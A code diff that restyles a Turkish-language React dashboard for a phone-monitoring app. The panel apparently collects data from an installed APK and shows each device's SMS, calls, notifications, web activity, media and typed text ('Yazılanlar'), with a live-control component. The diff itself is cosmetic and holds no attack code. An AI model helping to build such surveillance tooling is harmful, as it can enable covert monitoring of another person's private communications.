@@ -7,6 +7,18 @@ import { LoadingSkeleton } from '@/components/ui/LoadingSkeleton';
 import { PermissionPanel } from '@/components/PermissionPanel';
 import { LiveControl } from '@/components/LiveControl';
 import { DeviceDangerZone } from '@/components/DeviceDangerZone';
+import { DeviceStats } from '@/components/DeviceStats';
+
+const QUICK_LINKS = [
+  { href: 'social', label: 'Sosyal', icon: '💬', cls: 'quick-link-social' },
+  { href: 'apps', label: 'Uygulamalar', icon: '📱', cls: 'quick-link-apps' },
+  { href: 'calls', label: 'Aramalar', icon: '📞', cls: 'quick-link-calls' },
+  { href: 'sms', label: 'SMS', icon: '✉️', cls: 'quick-link-sms' },
+  { href: 'notifications', label: 'Bildirim', icon: '🔔', cls: 'quick-link-notif' },
+  { href: 'web', label: 'İnternet', icon: '🌐', cls: 'quick-link-web' },
+  { href: 'inputs', label: 'Yazılanlar', icon: '⌨️', cls: 'quick-link-inputs' },
+  { href: 'media', label: 'Medya', icon: '📷', cls: 'quick-link-media' },
+];
 
 export default function DashboardPage() {
   const [devices, setDevices] = useState<Device[]>([]);
@@ -38,10 +50,10 @@ export default function DashboardPage() {
     <div className="page-container">
       <div className="page-header">
         <div>
-          <h1 className="page-title">Ana Sayfa</h1>
-          <p className="page-subtitle">Cihazlar, izinler ve canlı kontrol</p>
+          <h1 className="page-title">Kontrol Merkezi</h1>
+          <p className="page-subtitle">Canlı istatistikler, grafikler ve cihaz yönetimi</p>
         </div>
-        <button type="button" onClick={() => load(true)} className="btn-secondary text-sm" disabled={refreshing}>
+        <button type="button" onClick={() => load(true)} className="btn-primary text-sm" disabled={refreshing}>
           {refreshing ? '↻ Güncelleniyor...' : '↻ Yenile'}
         </button>
       </div>
@@ -56,48 +68,53 @@ export default function DashboardPage() {
           <p>APK kurulumunda panel adresi ve bu hesabın e-postasını girin.</p>
         </div>
       ) : (
-        <div className="space-y-6">
+        <div className="space-y-8">
           {devices.map((device) => (
-            <div key={device.id} className="data-card">
-              <div className="flex items-start justify-between gap-2 mb-2">
-                <div className="min-w-0">
-                  <h3 className="font-semibold text-lg truncate">{device.deviceName}</h3>
-                  <p className="text-sm text-gray-500">
-                    {device.manufacturer && device.model
-                      ? `${device.manufacturer} ${device.model}`
-                      : 'Model bilgisi bekleniyor'}
-                    {' · '}v{device.apkVersion}
-                  </p>
+            <section key={device.id} className="w-full">
+              <div className="device-hero">
+                <div className="flex flex-wrap items-start justify-between gap-3">
+                  <div>
+                    <h2 className="text-2xl sm:text-3xl font-bold">{device.deviceName}</h2>
+                    <p className="text-indigo-100 mt-1 text-sm sm:text-base">
+                      {device.manufacturer && device.model
+                        ? `${device.manufacturer} ${device.model}`
+                        : 'Model bilgisi bekleniyor'}
+                      {' · '}APK v{device.apkVersion}
+                    </p>
+                    <p className="text-indigo-200/80 text-sm mt-2">
+                      Son senkron: {device.lastSeen ? formatDate(device.lastSeen) : 'Henüz yok'}
+                    </p>
+                  </div>
+                  <span className="badge bg-white/20 text-white border border-white/30 px-4 py-1.5 text-sm">
+                    {onlineLabel(device.lastSeen)}
+                  </span>
                 </div>
-                <span className="badge-green">
-                  {onlineLabel(device.lastSeen)}
-                </span>
               </div>
-              <p className="text-sm text-gray-500 mb-2">
-                Son senkron: {device.lastSeen ? formatDate(device.lastSeen) : 'Henüz yok'}
-              </p>
 
-              <PermissionPanel device={device} />
+              <DeviceStats deviceId={device.id} />
 
-              <div className="mt-4">
+              <div className="quick-links mb-5">
+                {QUICK_LINKS.map((link) => (
+                  <Link
+                    key={link.href}
+                    href={`/dashboard/${link.href}?device=${device.id}`}
+                    className={`quick-link ${link.cls}`}
+                  >
+                    <span className="text-xl">{link.icon}</span>
+                    <span>{link.label}</span>
+                  </Link>
+                ))}
+              </div>
+
+              <div className="grid grid-cols-1 xl:grid-cols-2 gap-5">
+                <PermissionPanel device={device} />
                 <LiveControl deviceId={device.id} />
               </div>
 
-              <div className="mt-4">
+              <div className="mt-5">
                 <DeviceDangerZone deviceId={device.id} deviceName={device.deviceName} />
               </div>
-
-              <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 mt-4">
-                <Link href={`/dashboard/social?device=${device.id}`} className="btn-secondary text-xs text-center">Sosyal</Link>
-                <Link href={`/dashboard/apps?device=${device.id}`} className="btn-secondary text-xs text-center">Uygulamalar</Link>
-                <Link href={`/dashboard/calls?device=${device.id}`} className="btn-secondary text-xs text-center">Aramalar</Link>
-                <Link href={`/dashboard/sms?device=${device.id}`} className="btn-secondary text-xs text-center">SMS</Link>
-                <Link href={`/dashboard/notifications?device=${device.id}`} className="btn-secondary text-xs text-center">Bildirimler</Link>
-                <Link href={`/dashboard/web?device=${device.id}`} className="btn-secondary text-xs text-center">İnternet</Link>
-                <Link href={`/dashboard/inputs?device=${device.id}`} className="btn-secondary text-xs text-center">Yazılanlar</Link>
-                <Link href={`/dashboard/media?device=${device.id}`} className="btn-secondary text-xs text-center">Medya</Link>
-              </div>
-            </div>
+            </section>
           ))}
         </div>
       )}
